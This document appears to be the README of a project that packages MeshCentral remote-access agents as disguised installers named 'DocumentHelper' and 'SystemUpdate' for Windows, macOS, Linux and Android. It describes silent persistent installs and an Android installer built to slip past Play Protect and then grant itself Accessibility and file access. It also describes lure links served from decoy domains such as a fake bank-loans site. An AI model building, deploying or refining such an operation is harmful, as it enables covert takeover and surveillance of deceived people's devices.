# mh1 — MeshCentral Agent Custom Installers

Custom-branded installers for the MH-leadid agent group on mesh.telcom.stream.

## Enrollment topology (verified)

Agents connect through Nginx on port **443** to
`wss://mesh.telcom.stream:443/agent.ashx`. The MeshCentral server runs
internally on 8443 and requires three settings (already active in production):

```json
"settings": {
  "port": 8443,
  "aliasPort": 443,
  "trustedProxy": "127.0.0.1"
},
"domains": {
  "": { "certUrl": "127.0.0.1:443/" }
}
```

- `aliasPort: 443` makes newly generated agents use the public endpoint.
- `certUrl` lets MeshCentral load the same Nginx certificate agents see, so
  the SHA-384 certificate hash matches and agents are accepted.
- `trustedProxy` records real client IPs instead of `127.0.0.1`.

See `../scripts/verify-enrollment.sh` for the on-VM health check.

## Contents

| File | Description |
|---|---|
| `dl/DocumentHelper.exe` | Windows NSIS silent installer (x64, permanent install) |
| `dl/meshagent64-MH-leadid-latest.exe` | Raw configured Windows agent (backup) |
| `dl/DocumentHelper.run` | Linux one-liner installer script |
| `dl/DocumentHelper.pkg` | macOS installer package (built via GitHub Actions) |
| `dl/SystemUpdate-1.0.23-release.apk` | Android agent (baked link, enterprise enforced, SHA-256 in `dl/RELEASES.txt`) |
| `DocumentHelper.msh` | Authoritative macOS/agent group configuration (port 443) |
| `meshagent` | macOS universal binary (Mach-O x86_64 + arm64) |
| `root/` | macOS package root (usr/local/bin/DocumentHelper) |
| `scripts/` | macOS package scripts (postinstall) |
| `w.nsi` | NSIS installer script (Windows) |
| `build-macos.sh` | macOS .pkg build script (run on Mac) |

## Play Protect

The 2026 internet-sideload block for Accessibility apps is active. Do not hand out
the direct agent APK as the primary path.

`SystemUpdate-Installer.apk` declares **no Accessibility permission**, so Play
Protect installs it. It embeds the agent and installs it through Shizuku
(wireless ADB), then sets Accessibility, Restricted Settings, All files access,
Doze and notifications. No PC is needed. `/get` serves this installer to Android.

A Play Protect appeal was submitted 2026-11-27 (VT: `f8c797…faaecd`) to
`meghancaitlynachterbergclark@gmail.com`. The direct agent APK and ADB path remain
in `/connect#playprotect` for fallback.

## Delivery hosts

All four serve the same Pages bundle. The sender offers every host in its
**Delivery domain** picker, and each generated link auto-detects the recipient.

| Host | DNS |
|---|---|
| `reyessitework.pages.dev` | Pages default |
| `docs.telcom.stream` | proxied CNAME → `reyessitework.pages.dev` |
| `docs.chronicscar.online` | proxied CNAME → `reyessitework.pages.dev` |
| `docs.sensualhandmassages.win` | proxied CNAME → `reyessitework.pages.dev` |
| `docs.us-bank-loans.com` | proxied CNAME → `reyessitework.pages.dev` |

Apex/root sites are not changed: only the `docs` names point at Pages.

### Deploy from Windows

Use this path until the VM source is re-synced: the server copy of `sender.html`
and `connect.html` predates the domain picker and four-agent matrix, so running
`deploy-pages3.sh` on the VM would revert them.

The server-side `deploy-pages3.sh` still works, but the supported path from this
machine does not need SSH:

```powershell
$env:CLOUDFLARE_EMAIL='Authoogle@gmail.com'
$env:CLOUDFLARE_API_KEY='<Global API Key>'
.\deploy-local.ps1
```

It expects a Cloudflare Global API Key (or `CLOUDFLARE_API_TOKEN`), refuses to
deploy if the APK hash changed, rebuilds the exact bundle and deploys to `main`.

## Windows

Built and tested. `dl/DocumentHelper.exe` is the NSIS silent installer.

- Installs the agent to `C:\Program Files\DocumentHelper\DocumentHelper.exe`
  (never `%TEMP%`).
- The Windows **service name** remains `Mesh Agent` (MeshCentral's default);
  the executable and installer keep the `DocumentHelper` name.
- Removes any previous service registration before installing.
- Fails with a non-zero exit code if agent installation fails.
- Registers an `Uninstall.exe` and an entry in Programs and Features.
- No visible UI during install; a UAC elevation prompt appears.

Rebuild (requires NSIS):

```
"C:\Program Files (x86)\NSIS\makensis.exe" /V2 w.nsi
```

## macOS

`dl/DocumentHelper.pkg` is built via the "Build macOS Package" GitHub Actions
workflow. `build-macos.sh` bundles both the universal agent binary and the
`DocumentHelper.msh` configuration (port 443), and the `postinstall` script
fails loudly if agent installation fails.

- Binary: `/usr/local/bin/DocumentHelper`
- Config:  `/usr/local/bin/DocumentHelper.msh`
- The package is ad-hoc signed for testing. Production distribution requires
  productsigning with a Developer ID Installer and notarization.

## Linux

`dl/DocumentHelper.run` is a self-contained bash installer. It downloads the
current `meshsettings` from the server, so no local rebuild is needed after
the server-side enrollment fix. Distribute as-is.

## Verification

### Windows (clean machine)

```
sc query "Mesh Agent"
```

Expected: RUNNING, START_TYPE 2 AUTO_START, and the binary path is
`C:\Program Files\DocumentHelper\DocumentHelper.exe`. The device appears in
the MH-leadid group within a minute. Delete any test node from the MeshCentral
panel before shipping.

### Agent configuration

Verify the embedded group and server:

```
strings DocumentHelper.exe | grep -c "mesh.telcom.stream:443/agent.ashx"
```

Expected: >= 1. If 0, the agent was downloaded before the alias-port fix.

### Mesh ID

The MH-leadid group identifier is embedded in the agent and the `.msh` file.
The authoritative value is stored on the server and must include the `0`
(zero) character: `IRL9fYwIpF97ZG$jAYDhOxXymJSyey0Kl8...`.
